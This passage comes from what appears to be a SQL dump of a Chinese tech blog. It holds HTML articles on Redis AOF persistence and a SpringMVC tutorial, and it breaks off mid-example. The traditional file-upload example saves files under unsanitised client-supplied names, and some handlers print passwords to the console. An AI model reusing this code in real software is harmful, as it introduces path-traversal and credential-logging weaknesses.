并不会先去对这些命令进行语法检查; 所以, 如果先记日志再执行命令的话, 日志中就有可能记录了错误的命令, Redis 在使用日志恢复数据时, 就可能会出错</p><p>Redis 使用写后日志这一方式的一大好处是, 可以避免出现记录错误命令的情况; 除此之外, AOF 还有一个好处: 它是在命令执行后才记录日志, 所以不会阻塞当前的写操作</p><p>AOF 两个潜在的风险:</p><p>如果刚执行完一个命令, 还没有来得及记日志就宕机了, 那么这个命令和相应的数据就有丢失的风险</p><p>AOF 虽然避免了对当前命令的阻塞, 但可能会给下一个操作带来阻塞风险; 这是因为, AOF 日志也是在主线程中执行的, 如果在把日志文件写入磁盘时, 磁盘写压力大, 就会导致写盘很慢, 进而导致后续的操作也无法执行了</p><p>以日志的形式记录每个写操作, 将Redis所有的写指令记录下来(不记录读操作), 只许追加文件不许修改文件, 相当于MySQL的脚本文件, 当Redis启动时就会加载appendonly.aof文件将写指令重新执行一遍来恢复数据</p><p>AOF 三种写回策略</p><ul><li>always, 同步写回: 每个写命令执行完, 立马同步地将日志写回磁盘</li><li>everysec, 每秒写回: 每个写命令执行完, 只是先把日志写到 AOF 文件的内存缓冲区, 每隔一秒把缓冲区中的内容写入磁盘</li><li>no, 操作系统控制的写回: 每个写命令执行完, 只是先把日志写到 AOF 文件的内存缓冲区, 由操作系统决定何时将缓冲区内容写回磁盘</li></ul><p><span class=\"ql-font-monospace\"><img src=\"https://cdn.qingweico.cn/blog/72f547f18dbac788c7d11yy167d7ebf8.jpg\" alt=\"img\"></span></p><p>AOF 重写机制</p><p>产生原因:</p><p>AOF 是以文件的形式在记录接收到的所有写命令, 随着接收的写命令越来越多, AOF 文件会越来越大, AOF 文件过大会带来性能问题</p><ul><li>文件系统本身对文件大小有限制, 无法保存过大的文件</li><li>如果文件太大, 之后再往里面追加命令记录的话, 效率也会变低</li><li>如果日志文件太大, 整个恢复过程就会非常缓慢</li></ul><p>AOF 重写机制就是在重写时, Redis 根据数据库的现状创建一个新的 AOF 文件, 也就是说, 读取数据库中的所有键值对, 然后对每一个键值对用一条命令记录它的写入</p><p>旧日志文件中的多条命令, 在重写后的新日志中变成了一条命令(AOF 文件是以追加的方式, 逐一记录接收到的写命令的; 当一个键值对被多条写命令反复修改时, AOF 文件会记录相应的多条命令; 但是, 在重写的时候, 是根据这个键值对当前的最新状态, 为它生成对应的写入命令)</p><p>注意, AOF的重写不是根据原有的AOF去做, 而是根据当前内存数据库的数据, 去生成一条条命令进行保存</p><p>和 AOF 日志由主线程写回不同, 重写过程是由后台子进程 bgrewriteaof 来完成的, 这也是为了避免阻塞主线程, 导致数据库性能下降</p><h4>APPEND ONLY MODE</h4><pre class=\"ql-syntax\" spellcheck=\"false\">appendonly no&nbsp;# 默认关闭 yes即代表打开aof的持久化\nappendfilename \"appendonly.aof\"\nredis-check-aof --fix appendonly.aof # 修复appendonly.aof文件\n</pre><p>dump.rdb文件和appendonly.aof文件可以同时存在,当二者同时存在时优先加载appendonly.aof文件</p><pre class=\"ql-syntax\" spellcheck=\"false\"># appendfsync always # 同步持久化 每当有数据发生变化时就会记录到磁盘 数据完整性好但是性能差\nappendfsync everysec # 出厂默认 异步操作 每秒记录数据 1s内宕机 数据丢失\n# appendfsync no\n</pre><p>关于 AOF 和 RDB 的选择问题</p><ul><li>数据不能丢失时, 内存快照和 AOF 的混合使用是一个很好的选择;</li><li>如果允许分钟级别的数据丢失, 可以只使用 RDB;</li><li>如果只用 AOF, 优先使用 everysec 的配置选项, 因为它在可靠性和性能之间取了一个平衡</li><li><br></li></ul><p><br></p>',5,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWKDYAyAO6bUAACDmnRA4kU03.jpeg',2,0,'220226DP09K1F0SW','目录目录redispersistenceRDB(RedisDatabase)SNAPSHOTTING快照AOF(AppendOnlyFile)APPENDONLYMODEredispersistenceRedis的持久化主要有两大机制,即AOF(AppendOnlyFile)日志和RDB快照RDB(RedisDatabase)内存快照,就是指内存中的数据在某一个时刻的状态记录在指定的时间间隔内将内',0,0,0,NULL,0,0,'2022-05-17 16:43:01','2022-05-17 16:43:01','[\"220329D4CRPCTPSW\",\"220329D180W7F2RP\"]',NULL),('220517BYAS47G0X4','SpringMVC','<h1>目录</h1><p><strong style=\"color: rgb(65, 131, 196);\">目录</strong></p><p><span style=\"color: rgb(65, 131, 196);\">SpringMVC</span></p><p><span style=\"color: rgb(65, 131, 196);\">SpringMVC环境搭建</span></p><p><span style=\"color: rgb(65, 131, 196);\">pom.xml</span></p><p><span style=\"color: rgb(65, 131, 196);\">web.xml</span></p><p><span style=\"color: rgb(65, 131, 196);\">resource目录下配置springmvc.xml文件</span></p><p><span style=\"color: rgb(65, 131, 196);\">配置视图解析器</span></p><p><span style=\"color: rgb(65, 131, 196);\">DispatcherServlet 前端控制器</span></p><p><span style=\"color: rgb(65, 131, 196);\">HandlerMapping 处理器映射器</span></p><p><span style=\"color: rgb(65, 131, 196);\">Handler 处理器</span></p><p><span style=\"color: rgb(65, 131, 196);\">HandlerAdapter 处理器适配器</span></p><p><span style=\"color: rgb(65, 131, 196);\">ViewResolver 视图解析器</span></p><p><span style=\"color: rgb(65, 131, 196);\">RequestMapping的属性</span></p><p><span style=\"color: rgb(65, 131, 196);\">请求参数绑定</span></p><p><span style=\"color: rgb(65, 131, 196);\">获取原生API的方式</span></p><p><span style=\"color: rgb(65, 131, 196);\">注解RequestParam</span></p><p><span style=\"color: rgb(65, 131, 196);\">RequestBody注解</span></p><p><span style=\"color: rgb(65, 131, 196);\">RESTFUL风格（PathVariable）</span></p><p><span style=\"color: rgb(65, 131, 196);\">RequestHeader注解</span></p><p><span style=\"color: rgb(65, 131, 196);\">CookieValue注解</span></p><p><span style=\"color: rgb(65, 131, 196);\">ModelAttribute注解</span></p><p><span style=\"color: rgb(65, 131, 196);\">SessionAttributes注解</span></p><p><span style=\"color: rgb(65, 131, 196);\">ModelAndView</span></p><p><span style=\"color: rgb(65, 131, 196);\">使用关键字进行重定向和请求转发</span></p><p><span style=\"color: rgb(65, 131, 196);\">响应JSON数据</span></p><p><span style=\"color: rgb(65, 131, 196);\">文件上传</span></p><p><span style=\"color: rgb(65, 131, 196);\">传统web文件上传</span></p><p><span style=\"color: rgb(65, 131, 196);\">mvc文件上传</span></p><p><span style=\"color: rgb(65, 131, 196);\">spring异常处理</span></p><p><span style=\"color: rgb(65, 131, 196);\">spring拦截器</span></p><p><span style=\"color: rgb(65, 131, 196);\">自定义实现HandlerInterceptor 接口的类</span></p><h2>SpringMVC</h2><h3>SpringMVC环境搭建</h3><h4>pom.xml</h4><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;!--导入Spring MVC开发环境所要的依赖--&gt;\n&lt;dependency&gt;\n&nbsp;&nbsp;&nbsp;&lt;groupId&gt;org.springframework&lt;/groupId&gt;\n&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;spring-web&lt;/artifactId&gt;\n&nbsp;&nbsp;&nbsp;&lt;version&gt;5.2.2.RELEASE&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n&nbsp;&nbsp;&nbsp;&lt;groupId&gt;org.springframework&lt;/groupId&gt;\n&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;\n&nbsp;&nbsp;&nbsp;&lt;version&gt;5.2.2.RELEASE&lt;/version&gt;\n&lt;/dependency&gt;\n</pre><h4>web.xml</h4><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;!--配置前端控制器--&gt;\n&lt;servlet&gt;\n&nbsp;&nbsp;&lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;\n&nbsp;&nbsp;&lt;!--SpringMVC提供的类--&gt;\n&nbsp;&nbsp;&lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; \n&nbsp;&lt;!--提供全局的初始化参数--&gt;\n&nbsp;&nbsp;&lt;init-param&gt;\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;!--服务器初始化时加载类路径下springmvc.xml的配置文件--&gt;\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-value&gt;classpath:springmvc.xml&lt;/param-value&gt;\n&nbsp;&nbsp;&lt;/init-param&gt;\n&nbsp;&nbsp;&lt;!--一般情况下当有请求时服务器才 会创建Servlet对象--&gt;\n&nbsp;&nbsp;&lt;!--此时应该当服务器完成初始化时就要创建Servlet对象,完成对springmvc配置文件的加载,完成注解扫描--&gt;\n&nbsp;&nbsp;&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;\n&lt;/servlet&gt;\n&lt;!--配置解决中文乱码的过滤器--&gt;\n&lt;filter&gt;\n&nbsp;&nbsp;&lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt;\n&nbsp;&nbsp;&lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;\n&nbsp;&nbsp;&lt;init-param&gt;\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-name&gt;encoding&lt;/param-name&gt;\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-value&gt;UTF-8&lt;/param-value&gt;\n&nbsp;&nbsp;&lt;/init-param&gt;\n&lt;/filter&gt;\n&lt;filter-mapping&gt;\n&nbsp;&nbsp;&lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt;\n&nbsp;&nbsp;&lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n&lt;servlet-mapping&gt;\n&nbsp;&nbsp;&lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;\n&nbsp;&nbsp;&lt;url-pattern&gt;/&lt;/url-pattern&gt;\n&lt;/servlet-mapping&gt;\n</pre><h4>resource目录下配置springmvc.xml文件</h4><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n&nbsp;&nbsp;&nbsp;xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \n&nbsp;&nbsp;&nbsp;xmlns:context=\"http://www.springframework.org/schema/context\"\n&nbsp;&nbsp;&nbsp;xmlns:mvc=\"http://www.springframework.org/schema/mvc\"\n&nbsp;&nbsp;&nbsp;xsi:schemaLocation=\"http://www.springframework.org/schema/beans \n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://www.springframework.org/schema/beans/spring-beans.xsd\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://www.springframework.org/schema/context\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.springframework.org/schema/context/spring-context.xsd\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://www.springframework.org/schema/mvc\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://www.springframework.org/schema/mvc/spring-mvc.xsd\"&gt;\n&lt;/beans&gt;\n&lt;!--开启注解扫描--&gt;\n&lt;context:component-scan base-package=\"cn.qingweico\"/&gt;\n@Controller&nbsp;//表明当前类是一个控制类\n@RequestMapping(path = \"/hello\")\npublic String hello() {\n&nbsp;&nbsp;System.out.println(\"请求成功!\");\n&nbsp;&nbsp;/*mvc下成功跳转页面 success.jsp文件*/\n&nbsp;&nbsp;return \"success\";&nbsp;\n}\n</pre><h4>配置视图解析器</h4><pre class=\"ql-syntax\" spellcheck=\"false\"> &lt;!--视图解析器对象--&gt;\n&lt;bean id=\"internalResourceViewResolver\" class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\"&gt; \n&nbsp;&nbsp;&lt;!--prefix:前缀 寻找类路径下/WEB-INF/pages/下的视图--&gt;\n&nbsp;&nbsp;&lt;property name=\"prefix\" value=\"/WEB-INF/pages/\"/&gt;\n&nbsp;&nbsp;&lt;!--suffix:后缀 匹配以.jsp后缀结束的视图--&gt;\n&nbsp;&nbsp;&lt;property name=\"suffix\" value = \".jsp\"/&gt;\n&lt;/bean&gt;\n&lt;!--开启SpringMvc注解的支持--&gt;\n&lt;mvc:annotation-driven/&gt;\n</pre><h3>DispatcherServlet 前端控制器</h3><p>DispatcherServlet是整个流程控制的核心,当用户请求到达前端控制器时,由它调用其他组件来处理用户的请求,正是DispatcherServlet的存在降低了组件之间的耦合性</p><h3>HandlerMapping 处理器映射器</h3><p>HandlerMapping根据用户的请求找到JHandler 即处理器</p><h3>Handler 处理器</h3><p>它是我们开发中要编写的具体业务控制器,由DispatcherServlet把用户请求转发到Handler,由Handler对具体的用户请求进行处理</p><h3>HandlerAdapter 处理器适配器</h3><p>通过HandlAdapter对处理器进行执行,这是适配器模式的应用,通过扩展适配器可以对更多类型的处理器进行执行</p><h3>ViewResolver 视图解析器</h3><p>View Resolver负责将处理的结果生成视图。View Resolver首先根据逻辑视图名解析成物理视图名即具体的页面地址,再生成具体的视图对象,最后对视图进行渲染将处理结果通过页面展示给用户</p><h3>RequestMapping的属性</h3><pre class=\"ql-syntax\" spellcheck=\"false\">@RequestMapping(path = \'\')   //用于建立请求URL和请求方法之间的对应关系\n#放在类上表示请求的一级目录,放在方法上表示请求的二级目录\n@RequestMapping(value = \'\')  //path和value表示相同的作用,即请求的URL地址,当只有URL时可以省略\n@RequestMapping(value = \'\', method = RequestMethod.GET) \nmethod:表示请求的方式 (GET,HEAD,POST,PUT,PATCH,DELETE,OPTIONS,TRACE)\nparams:表示指定限制请求参数的条件\nheaders：用于指定限制请求消息头的条件\n#上面四个属性出现二个以及以上时属性之间是与的关系\n</pre><h3>请求参数绑定</h3><ul><li>基本数据类型和String类型</li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">@RequestMapping(path = \"/hello\", method = RequestMethod.GET)\npublic String hello(String username, int password) {\n    System.out.println(\"你好\" + username + \"!\" + \" 你的密码是\" + password);\n    return \"success\";\n}\n&lt;!--提交数据的键要和参数的名称要相同--&gt;\n&lt;a href=\"hello?username=jack&amp;password=21\"&gt;登陆&lt;/a&gt;\n</pre><ul><li>JavaBean</li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">@RequestMapping(value = \"/test\", method = {RequestMethod.POST})\npublic String test(Account account) {\n    System.out.println(account);\n    return \"success\";\n}\n&lt;form action=\"test\" method=\"post\"&gt;\n    &lt;!--name的值与实体类中的属性名保持一致--&gt;\n    &lt;!--而且实体类中一定要有属性的set方法,这样才能把数据封装到实体类中--&gt;\n    姓名:&lt;input type=\"text\" name=\"username\"&gt;&lt;br&gt;  \n    密码:&lt;input type=\"text\" name=\"password\"&gt;\n    &lt;input type=\"submit\" value=\"提交\"&gt;\n&lt;/form&gt;\n</pre><ul><li>实体类中含有引用类型</li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;form action=\"test\" method=\"post\"&gt;\n    姓名:&lt;input type=\"text\" name=\"username\"&gt;&lt;br&gt;\n    密码:&lt;input type=\"text\" name=\"password\"&gt;&lt;br&gt;\n    &lt;!--使用实体类中引用属性名称.引用实体类属性--&gt;\n    学号:&lt;input type=\"text\" name=\"user.number\"&gt;&lt;br&gt;\n    年龄:&lt;input type=\"text\" name=\"user.age\"&gt;&lt;br&gt;\n    &lt;input type=\"submit\" value=\"提交\"&gt;\n&lt;/form&gt;\n</pre><ul><li>集合类型</li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">private  List&lt;User&gt; list;\nprivate Map&lt;Integer,User&gt; map;\n&lt;form action=\"test\" method=\"post\"&gt;\n    姓名:&lt;input type=\"text\" name=\"username\"&gt;&lt;br&gt;\n    密码:&lt;input type=\"text\" name=\"password\"&gt;&lt;br&gt;\n    &lt;!--将数据封装到User对象存入List集合的第一个位置--&gt;\n    学号:&lt;input type=\"text\" name=\"list[0].number\"&gt;&lt;br&gt;\n    年龄:&lt;input type=\"text\" name=\"list[0].age\"&gt;&lt;br&gt;\n    &lt;!--将数据封装到User对象存入键为0的位置--&gt;\n    学号:&lt;input type=\"text\" name=\"map[0].number\"&gt;&lt;br&gt;\n    年龄:&lt;input type=\"text\" name=\"map[0].age\"&gt;&lt;br&gt;\n    &lt;input type=\"submit\" value=\"提交\"&gt;\n&lt;/form&gt;\n</pre><h3>获取原生API的方式</h3><pre class=\"ql-syntax\" spellcheck=\"false\">@RequestMapping(value = \"/servlet\")\npublic String servlet(HttpServletRequest request) {\n    System.out.println(request);\n    HttpSession session = request.getSession();\n    System.out.println(session);\n    ServletContext servletContext = session.getServletContext();\n    System.out.println(servletContext);\n    return \"success\";\n}\n</pre><h3>注解RequestParam</h3><pre class=\"ql-syntax\" spellcheck=\"false\">@RequestMapping(path = \"/hello\",method = RequestMethod.GET)\n    //@RequestMapping参数中name和value属性的作用是一样的,且当只有一个参数时可以省略\n    //参数required类型为boolean默认是true,当为false时,请求中可以没有name属性\n    public String hello(@RequestParam(name = \"name\")String username) {\n    System.out.println(\"你好\" + username + \"!\");\n    return \"success\";\n}\n&lt;a href=\"hello?name=helloWorld\"&gt;Hello&lt;/a&gt; &lt;!--URL之间不要留空格--&gt;\n</pre><h3>RequestBody注解</h3><p>主要用来接收前端传递给后端的json字符串中的数据的,且@RequestBody最多只能有一个</p><pre class=\"ql-syntax\" spellcheck=\"false\">@RequestMapping(value = \"/body\")\n    public String body(@RequestBody String body) {\n    System.out.println(body);\n    return \"success\";\n}\n</pre><h3>RESTFUL风格（PathVariable）</h3><pre class=\"ql-syntax\" spellcheck=\"false\">@RequestMapping(value = \"/rest/{id}\")\n    public String rest(@PathVariable(name = \"id\") String id) {\n    System.out.println(id);\n    return \"success\";\n}\n&lt;a href=\"rest/我是id\"&gt;Restful&lt;/a&gt;\n</pre><h3>RequestHeader注解</h3><pre class=\"ql-syntax\" spellcheck=\"false\">/*获取请求头的值*/\n@RequestMapping(value = \"/header\")\n    public String head(@RequestHeader(value = \"Cookie\") String header) {\n    System.out.println(header);\n    return \"success\";\n}\n</pre><h3>CookieValue注解</h3><pre class=\"ql-syntax\" spellcheck=\"false\">/*获取指定cookie的值*/\n@RequestMapping(value = \"/Cookie\")\n    public String Cookie(@CookieValue(value = \"JSESSIONID\") String cookie) {\n    System.out.println(cookie);\n    return \"success\";\n}\n</pre><h3>ModelAttribute注解</h3><p>该注解既可以修饰方法也可以修饰参数</p><p>修饰方法时代表该方法会在控制器方法执行之前执行</p><p>修饰参数时可以获取指定的数据给参数赋值</p><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;!--当用户输入的数据不完整时,即没有输入学号和年龄时,可以通过先执行带有ModelAttribute注解的方法来获取学号和年龄,从而保证数据的完整性--&gt;\n&lt;form action=\"model\" method=\"post\"&gt;\n    用户名：&lt;label&gt;&lt;input type=\"text\" name=\"username\"&gt;&lt;/label&gt;&lt;br&gt;\n    密码:&lt;label&gt;&lt;input type=\"text\" name=\"password\"&gt;&lt;/label&gt;&lt;br&gt;\n    学号:&lt;input type=\"text\" name=\"user.number\"&gt;&lt;br&gt;\n    年龄:&lt;input type=\"text\" name=\"user.age\"&gt;&lt;br&gt;\n    &lt;input type=\"submit\" value=\"提交\"&gt;\n&lt;/form&gt;\n</pre><ul><li>有返回值</li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">@ModelAttribute \n    public Account modelAttribute(String username){\n    Account account = new Account();\n    //模拟从数据库中查询\n    User user = findByName(username);\n    user.setNumber(\"007\");\n    user.setAge(\"21\");\n    account.setUser(user);\n    return account;\n}\n@RequestMapping(\"/model\")\n    public String model(Account account){\n    System.out.println(account);\n    return \"success\";\n}\n</pre><ul><li>无返回值</li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">@ModelAttribute\npublic void modelAttribute(Map&lt;String, Account&gt; map,String username) {\n    Account account = new Account();\n    User user = findByName(username);\n    user.setAge(\"21\");\n    user.setNumber(\"007\");\n    account.setUser(user);\n    map.put(\"user\", account); //使用map集合把account对象存入map集合中\n}\n@RequestMapping(\"/model\")\n    public String model(@ModelAttribute(\"user\") Account account){\n    System.out.println(account);\n    return \"success\";\n}\n</pre><h3>SessionAttributes注解</h3><pre class=\"ql-syntax\" spellcheck=\"false\">@RequestMapping(\"/sessionAttribute\")\n    public String session(ModelMap model){\n    /*以键值对的形式将message和SessionAttributes存入到request域对象中*/\n    model.addAttribute(\"message\",\"SessionAttribute\");\n    /*从session域中取得message的值*/\n    model.get(\"message\");\n    return \"success\";\n}\n//将message在存入到session域中\n@SessionAttributes(value = \"message\")// 标注在类上 value可以换成names names和value可以省略\n//删除session域对象\n@RequestMapping(\"/deleteSessionAttribute\")\n    public String deleteSession(SessionStatus sessionStatus){\n    sessionStatus.setComplete();\n    return \"success\";\n}\n</pre><h3>ModelAndView</h3><pre class=\"ql-syntax\" spellcheck=\"false\">@RequestMapping(\"/ModelAndView\")\n    public ModelAndView modelAndView(){\n    ModelAndView modelAndView = new ModelAndView();\n    User user = new User();\n    user.setNumber(\"007\");\n    user.setAge(\"21\");\n    /*将user存入request域对象中*/\n    modelAndView.addObject(\"user\",user);\n    /*设置成功要跳转的页面*/\n    modelAndView.setViewName(\"success\");\n    return modelAndView;\n}\n</pre><h3>使用关键字进行重定向和请求转发</h3><pre class=\"ql-syntax\" spellcheck=\"false\">@RequestMapping(\"/forwardAndRedirect\")\n    public String forwardAndDirect(){\n    return  \"forward:WEB-INF/pages/success.jsp\"; //请求转发\n  //return \"redirect:test.jsp\";                  重定向  重定向无法访问WEB-INF下的文件\n}\n</pre><h3>响应JSON数据</h3><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;!--导入java解析json数据格式的依赖--&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;\n    &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;\n    &lt;version&gt;2.9.8&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;\n    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;\n    &lt;version&gt;2.9.8&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;\n    &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;\n    &lt;version&gt;2.9.8&lt;/version&gt;\n&lt;/dependency&gt;\n</pre><p>在webapp下新建js文件夹导入jquery文件</p><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;!--在springmvc.xml配置文件中过滤js文件夹下所有的静态资源 默认会被前端控制器拦截--&gt;\n&lt;mvc:resources mapping=\"/js/**\" location=\"/js/\"/&gt;\n&lt;!--二者作用相等--&gt;\n&lt;mvc:default-servlet-handler /&gt;\n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;script src=\"js/JQuery.3.4.1.js\"&gt;&lt;/script&gt;\n&lt;script&gt;\n    $(function () {\n        $(\"#btn\").on(\"click\",function () {\n                    $.ajax({\n                         type: \"post\",\n                         dataType: \"json\",\n                         url: \"/testAjax\",\n                         data: \'{\"name\":\"22\",\"number\":122}\',\n                         contentType: \"application/json;charset=utf-8\",\n                         success:function (data) {\n                         console.log(data);   //name:\"张三\",number:7\n                         }\n                    });\n            }\n        )\n    });\n&lt;/script&gt;\n&lt;body&gt;\n&lt;button id=\"btn\"&gt;发送ajax请求&lt;/button&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n@RequestMapping(\"/testAjax\")\n/*@RequestBody 会将请求的json数据（String类型）格式转换为java对象封装到Student对象中*/\n/*ResponseeBody  会将javaBean转换为json响应到前端*/\npublic @ResponseBody Student ajax(@RequestBody Student student) {\n    System.out.println(student);\n    student.setName(\"张三\");\n    student.setNumber(7);\n    return student;\n}\n</pre><p><strong><em>注意:实体类中不能有有参构造方法</em></strong></p><h3>文件上传</h3><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;!--导入文件上传的依赖--&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;commons-fileupload&lt;/groupId&gt;\n    &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt;\n    &lt;version&gt;1.3.3&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;commons-io&lt;/groupId&gt;\n    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;\n    &lt;version&gt;2.4&lt;/version&gt;\n&lt;/dependency&gt;\n</pre><p>form表单的要求 enctype属性必须是\"multipart/form-data\" method属性必须是post 且提供一个文件选择域<code style=\"background-color: rgb(243, 244, 244);\">&lt;input type = \"file\"&gt;</code></p><h4>传统web文件上传</h4><pre class=\"ql-syntax\" spellcheck=\"false\">@RequestMapping(\"/upload\")\npublic String upload(HttpServletRequest request) throws Exception{\n    System.out.println(\"文件上传中...\");\n    String path = request.getSession().getServletContext().getRealPath(\"/upload/\");\n    DiskFileItemFactory diskFileItemFactory = new DiskFileItemFactory();\n    ServletFileUpload servletFileUpload = new ServletFileUpload(diskFileItemFactory);\n    List&lt;FileItem&gt; items = servletFileUpload.parseRequest(request);\n    for(FileItem item : items){\n        String fileName = item.getName();\n        item.write(new File(path,fileName));\n    }\n    System.out.println(\"文件上传成功...\");\n    return \"success\";\n}\n</pre><h4>mvc文件上传</h4><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;!--配置文件解析器对象--&gt;\n&lt;bean id=\"multipartResolver\" \n       class=\"org.springframework.web.multipart.commons.CommonsMultipartResolver\"&gt;\n       &lt;property name=\"maxUploadSize\" value=\"10000000\"/&gt;&lt;!--配置上传文件的最大值 单位字节--&gt;\n&lt;/bean&gt;\n@RequestMapping(\"/mvcUpload\")\npublic String MvcUpload(HttpServletRequest request, MultipartFile upload) throws IOException {\n    System.out.println(\"文件上传中...\");\n    String path = request.getSession().getServletContext().getRealPath(\"/mvcUpload/\");\n    String fileName = upload.getOriginalFilename();\n    Objects.requireNonNull(fileName);\n    String newFileName = UUID.randomUUID() + fileName.substring(fileName.lastIndexOf(\".\"));\n    upload.transferTo(new File(path, newFileName));\n    System.out.println(\"文件上传成功\");\n    return \"success\";\n}\n&lt;form enctype=\"multipart/form-data\" action=\"mvcUpload\" method=\"post\"&gt;\n    &lt;label&gt;选择文件：&lt;/label&gt;\n    &lt;!--name的属性值必须和参数MultipartFile的值一样--&gt;\n    &lt;input type=\"file\" name=\"upload\"&gt;&lt;br&gt;\n    &lt;input type=\"submit\" value=\"提交\"&gt;\n&lt;/form&gt;\n</pre><h3>spring异常处理</h3><pre class=\"ql-syntax\" spellcheck=\"false\">// 自定义异常类\npublic class SysException extends Exception {\n    private String errorMessage;\n    public SysException(String errorMessage) {\n    	this.errorMessage = errorMessage;\n    }\n    public String getErrorMessage() {\n    	return errorMessage;\n    }\n    public void setErrorMessage(String errorMessage) {\n   		this.errorMessage = errorMessage;\n    }\n}\n// 配置异常处理类\npublic class SysExceptionResolver implements HandlerExceptionResolver {\n    public ModelAndView resolveException(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e) {\n    SysException sysException = null;\n    if(e instanceof  SysException){\n    	sysException = (SysException) e;\n    }else {\n    	sysException = new SysException(\"系统正在维护。。。\");\n    }\n    ModelAndView mv = new ModelAndView();\n    mv.addObject(\"errorMessage\",sysException.getErrorMessage());\n    /*遇到异常跳到错误页面,并显示错误信息*/\n    mv.setViewName(\"error\");\n    return mv;\n    }\n}\n&lt;!--配置异常解析器--&gt;\n&lt;!--将异常处理类加入到ioc容器中--&gt;\n&lt;bean id=\"exceptionResolver\" class=\"cn.qingweico.exception.SysExceptionResolver\"/&gt;\n</pre><h3>spring拦截器</h3><p>spirng拦截器和过滤器的区别：</p><ul><li>过滤器可以在任何的java web项目下使用,属于servlet技术,可以过滤任何请求</li><li>拦截器只能在springmvc环境下使用,属于springmvc框架自带的技术,只能对Controller层请求有效</li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;mvc:interceptors&gt;\n    &lt;mvc:interceptor&gt;\n        &lt;!--配置要拦截的方法--&gt;\n        &lt;!--/**表示拦截任何的请求--&gt;\n        &lt;mvc:mapping path=\"/**\"/&gt;\n        &lt;!--配置不要拦截的方法--&gt;\n        &lt;!--&lt;mvc:exclude-mapping path=\"\"/&gt;--&gt;\n        &lt;bean class=\"cn.qingweico.interceptor.MyInterceptor\"/&gt;\n    &lt;/mvc:interceptor&gt;\n&lt;/mvc:interceptors&gt;\n</pre><h4>自定义实现HandlerInterceptor 接口的类</h4><pre class=\"ql-syntax\" spellcheck=\"false\">public class MyInterceptor implements HandlerInterceptor {\n    // 拦截请求,访问controller之前\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        System.out.println(\"我是拦截器的预处理方法...\");\n        request.getRequestDispatcher(\"upload.jsp\").forward(request,response);\n        return true;  //true表示放行 false表示不放行\n    }\n	// 请求访问到controller之后, 渲染视图之前\n    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {\n       System.out.println(\"我是拦截器的后处理方法...\");\n       request.getRequestDispatcher(\"upload.jsp\").forward(request,response);\n    }\n	// 请求访问到controller之后, 